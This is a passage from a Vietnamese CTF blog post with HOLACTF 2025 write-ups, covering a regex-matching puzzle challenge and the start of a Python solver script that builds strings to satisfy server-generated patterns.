<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  

  
  <title>HOLACTF 2025 Writeups | nukoneZ</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="Writeups chi ti·∫øt c√°c challenge trong HOLACTF 2025.">
<meta property="og:type" content="article">
<meta property="og:title" content="HOLACTF 2025 Writeups">
<meta property="og:url" content="https://kykhongbithac.github.io/2025/09/01/HOLACTF%202025%20Writeups/">
<meta property="og:site_name" content="nukoneZ">
<meta property="og:description" content="Writeups chi ti·∫øt c√°c challenge trong HOLACTF 2025.">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/ry27yMfcgl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SyifzfGqxe.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJvKMMM5lg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Bkh07Mz9gg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rk8cHzGcll.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJoWrWf9xg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hkcut-f5xx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HynFjbMcxx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S1Zon-G9gl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B1Tdf8-qgx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rkwKzLZceg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJGsG8b5ge.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJmHjIW5ex.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B103sL-cgg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H1rp3PWqxx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJQ31_Zclx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Sk_TGOWqlg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/r13x2Obqxe.png">
<meta property="og:image" content="https://hackmd.io/_uploads/r1dsZKW5eg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HJQm4t-9ll.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJAvjt-qlg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BkR_hKZcxg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B1emaFW5gg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rk0ymTZ9lg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/r1wy4a-9eg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJnA4pb9el.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Skfg3bM9le.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Syt52Zz9eg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H1lCTbG9gg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJ2cxGz5eg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hk05zMGcge.jpg">
<meta property="og:image" content="https://hackmd.io/_uploads/Bk0IQzG9xg.jpg">
<meta property="og:image" content="https://hackmd.io/_uploads/rytpmMfqxe.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SyXmVzz9xl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SkKY4zM9xe.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Sk-A4ff9ge.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HysYSzMqll.png">
<meta property="article:published_time" content="2025-08-31T18:58:00.000Z">
<meta property="article:modified_time" content="2025-08-31T18:54:38.000Z">
<meta property="article:author" content="Hu·ª≥nh Qu·ªëc K·ª≥">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="HOLACTF2025">
<meta property="article:tag" content="FPTU">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/ry27yMfcgl.png">
  
    <link rel="alternate" href="/atom.xml" title="nukoneZ" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/image/favicon.png">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/image/background.gif" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="  ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>nukoneZ </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
      </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/image/avata.gif></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">nukoneZ </div>
      <div class="dot"></div>
      <div class="subtitle">Blog | CTF | Security </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://www.facebook.com/quocky05" title="Facebook"><i class="fa-brands fa-facebook"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://www.instagram.com/nukonez" title="Instagram"><i class="fa-brands fa-instagram"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/kykhongbithac" title="GitHub"><i class="fa-brands fa-github"></i></a>
        
          <a class="link-btn" href="mailto:huynhky3010@gmail.com" title="Gmail"><i class="fa-solid fa-envelope"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/Write-up/">
                Write-up
                <div class="category-count">6</div>
            </a>
        
            <a class="category-link" href="/categories/Malware-Analysis/">
                Malware Analysis
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/Blog/">
                Blog
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Tags</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Analysis/" rel="tag">Analysis</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/FPTU/" rel="tag">FPTU</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HCMUS-CTF-2025/" rel="tag">HCMUS-CTF-2025</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HOLACTF2025/" rel="tag">HOLACTF2025</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HacktheonSejong/" rel="tag">HacktheonSejong</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Korea-%F0%9F%87%B0%F0%9F%87%B7/" rel="tag">Korea üá∞üá∑</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Malware/" rel="tag">Malware</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PTITHCM-CTF-2025/" rel="tag">PTITHCM CTF 2025</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Reverse-Engineering/" rel="tag">Reverse Engineering</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ScriptCTF2025/" rel="tag">ScriptCTF2025</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Security/" rel="tag">Security</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Trips/" rel="tag">Trips</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/VM/" rel="tag">VM</a></li></ul>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Archives</h3>
      
      
        <a class="archive-link" href="/archives/2025/09 ">
          September 2025 
          <div class="archive-count">2 </div>
        </a>
      
        <a class="archive-link" href="/archives/2025/08 ">
          August 2025 
          <div class="archive-count">6 </div>
        </a>
      
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/2025/09/17/fob%20PTITHCM%20CTF%202025/" title="Reverse/fob (PTITHCM 2025)" >
            <div class="recent-link-text">
              Reverse/fob (PTITHCM 2025)
            </div>
          </a>
        
          <a class="recent-link" href="/2025/09/01/HOLACTF%202025%20Writeups/" title="HOLACTF 2025 Writeups" >
            <div class="recent-link-text">
              HOLACTF 2025 Writeups
            </div>
          </a>
        
          <a class="recent-link" href="/2025/08/19/Korea-2025/" title="Hacktheon Sejong 2025 üá∞üá∑" >
            <div class="recent-link-text">
              Hacktheon Sejong 2025 üá∞üá∑
            </div>
          </a>
        
          <a class="recent-link" href="/2025/08/19/Indefinite/" title="Reverse/Indefinite" >
            <div class="recent-link-text">
              Reverse/Indefinite
            </div>
          </a>
        
          <a class="recent-link" href="/2025/08/19/hcmusctf2025/" title="Reverse/HCMUS-CTF 2025" >
            <div class="recent-link-text">
              Reverse/HCMUS-CTF 2025
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       


<article id="post-HOLACTF 2025 Writeups" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        HOLACTF 2025 Writeups
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2025-08-31T18:58:00.000Z" itemprop="datePublished">2025-09-01</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/Write-up/">Write-up</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            89k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/FPTU/" rel="tag">FPTU</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HOLACTF2025/" rel="tag">HOLACTF2025</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h1 id="HOLACTF-2025-Writeups"><a href="#HOLACTF-2025-Writeups" class="headerlink" title="HOLACTF 2025 Writeups"></a>HOLACTF 2025 Writeups</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="the-REGEX"><a href="#the-REGEX" class="headerlink" title="the REGEX"></a>the REGEX</h3><h4 id="Mo-ta"><a href="#Mo-ta" class="headerlink" title="M√¥ t·∫£"></a>M√¥ t·∫£</h4><ul>
<li>Service: <code>nc host port</code></li>
<li>Server ƒë∆∞a ra <strong>10 round</strong>, m·ªói round l√† m·ªôt <strong>regex pattern</strong> ng·∫´u nhi√™n.</li>
<li>Nhi·ªám v·ª•: g·ª≠i m·ªôt chu·ªói ASCII printable (0x20‚Äì0x7E) sao cho <strong>kh·ªõp ho√†n to√†n</strong> v·ªõi pattern ƒë√≥.</li>
<li>M·ªói round gi·ªõi h·∫°n 5s, ƒë·ªô d√†i input ‚â§ 256.</li>
<li>N·∫øu v∆∞·ª£t qua 10 round s·∫Ω nh·∫≠n ƒë∆∞·ª£c flag <code>HOLACTF&#123;...&#125;</code>.</li>
</ul>
<hr>
<h4 id="Phan-tich"><a href="#Phan-tich" class="headerlink" title="Ph√¢n t√≠ch"></a>Ph√¢n t√≠ch</h4><p>Regex m√† server sinh ra c√≥ ƒë·∫∑c ƒëi·ªÉm:</p>
<ul>
<li>Lu√¥n ƒë∆∞·ª£c bao b·ªüi <code>^ ... $</code> (full match).</li>
<li>D√πng nhi·ªÅu lookahead <code>(?=...)</code> ƒë·ªÉ √°p ƒë·∫∑t r√†ng bu·ªôc:<ul>
<li><code>(?=.&#123;10&#125;$)</code> √©p ƒë·ªô d√†i &#x3D; 10.</li>
<li><code>(?=.&#123;5&#125;[J-Q])</code> √©p k√Ω t·ª± th·ª© 5 ‚àà <code>[J-Q]</code>.</li>
<li><code>(?=.&#123;3&#125;[0-9])</code> √©p k√Ω t·ª± th·ª© 3 ‚àà <code>[0-9]</code>.</li>
<li><code>(?=.&#123;1&#125;(?P&lt;E0&gt;[UVW]).&#123;5&#125;(?P=E0))</code> t·∫°o bi·∫øn <code>E0</code> v√† bu·ªôc l·∫∑p l·∫°i.</li>
</ul>
</li>
<li>M·ªôt s·ªë m·∫´u kh√°c: <code>(?=(?:.*\d)&#123;3&#125;)</code> (√≠t nh·∫•t 3 ch·ªØ s·ªë), <code>(?=.&#123;i&#125;[class]&#123;k&#125;)</code>, backreference theo nh√≥m s·ªë <code>\1</code>, v.v.</li>
</ul>
<p>ƒêi·ªÉm kh√≥:</p>
<ul>
<li>Regex thay ƒë·ªïi m·ªói l·∫ßn k·∫øt n·ªëi.</li>
<li>C√≥ tham chi·∫øu ng∆∞·ª£c (<code>(?P=name)</code>, <code>\1</code>).</li>
<li>Th·ªùi gian r·∫•t g·∫•p, n√™n kh√¥ng th·ªÉ g√µ tay ‚Üí ph·∫£i vi·∫øt script t·ª± ƒë·ªông.</li>
</ul>
<hr>
<h4 id="Y-tuong-giai"><a href="#Y-tuong-giai" class="headerlink" title="√ù t∆∞·ªüng gi·∫£i"></a>√ù t∆∞·ªüng gi·∫£i</h4><ol>
<li><strong>Tr√≠ch regex pattern</strong> t·ª´ output c·ªßa server.</li>
<li><strong>Ph√¢n t√≠ch r√†ng bu·ªôc</strong>:<ul>
<li>ƒê·ªô d√†i chu·ªói (<code>.&#123;N&#125;$</code>).</li>
<li>R√†ng bu·ªôc v·ªã tr√≠ (<code>.&#123;i&#125;[class]</code>).</li>
<li>R√†ng bu·ªôc ƒëo·∫°n l·∫∑p (<code>.&#123;i&#125;[class]&#123;k&#125;</code>).</li>
<li>R√†ng bu·ªôc backref (k√Ω t·ª± b·∫±ng nhau).</li>
<li>R√†ng bu·ªôc s·ªë l·∫ßn xu·∫•t hi·ªán (<code>(?:.*SPEC)&#123;k&#125;</code>).</li>
</ul>
</li>
<li>V·ªõi m·ªói v·ªã tr√≠, gi·ªØ m·ªôt <strong>t·∫≠p k√Ω t·ª± kh·∫£ dƒ©</strong>.</li>
<li>√Åp d·ª•ng t·∫•t c·∫£ r√†ng bu·ªôc ƒë·ªÉ thu h·∫πp t·∫≠p.</li>
<li>Sinh chu·ªói ·ª©ng vi√™n:<ul>
<li>∆Øu ti√™n ch·ªçn ch·ªØ&#x2F;s·ªë cho d·ªÖ match.</li>
<li>N·∫øu c√≥ backref th√¨ copy cho ƒë√∫ng.</li>
<li>Ki·ªÉm tra b·∫±ng <code>re.fullmatch</code> tr∆∞·ªõc khi g·ª≠i.</li>
<li>N·∫øu ch∆∞a kh·ªõp, th·ª≠ random trong t·∫≠p cho ph√©p ƒë·∫øn khi th√†nh c√¥ng.</li>
</ul>
</li>
<li>G·ª≠i chu·ªói cho server trong v√≤ng 5s.</li>
<li>L·∫∑p l·∫°i 10 l·∫ßn ‚Üí nh·∫≠n flag.</li>
</ol>
<hr>
<h4 id="Script-exploit"><a href="#Script-exploit" class="headerlink" title="Script exploit"></a>Script exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># solve_regex_extreme.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote, context</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line">ASCII_PRINTABLE = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x7F</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">expand_escape</span>(<span 